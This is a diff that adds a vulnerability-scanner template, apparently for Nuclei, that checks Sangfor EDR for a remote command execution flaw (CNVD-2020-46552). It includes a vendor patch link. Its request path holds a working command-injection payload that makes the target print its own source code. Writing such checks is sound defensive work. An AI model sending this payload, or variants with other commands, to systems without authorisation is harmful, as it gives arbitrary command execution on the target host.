@@ -1,0 +1,25 @@
+id: CNVD-2020-46552
+info:
+  name: Sangfor EDR - Remote Code Execution
+  author:
+  - l0ne1y
+  description: |-
+    深信服终端监测响应平台（EDR）远程命令执行漏洞
+    深信服终端监测响应平台（EDR）存在远程命令执行漏洞。攻击者可通过构造HTTP请求来利用此漏洞，成功利用此漏洞的攻击者可以在目标主机上执行任意命令。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.sangfor.com.cn/product/net-safe-mobile-security-edr.html
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - contains(body, "$show_input = function($info)")
+    - contains(body, "$strip_slashes($host)")
+    - contains(body, "Log Helper")
+    - status_code == 200
+  path:
+  - '{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php'
+  method: GET
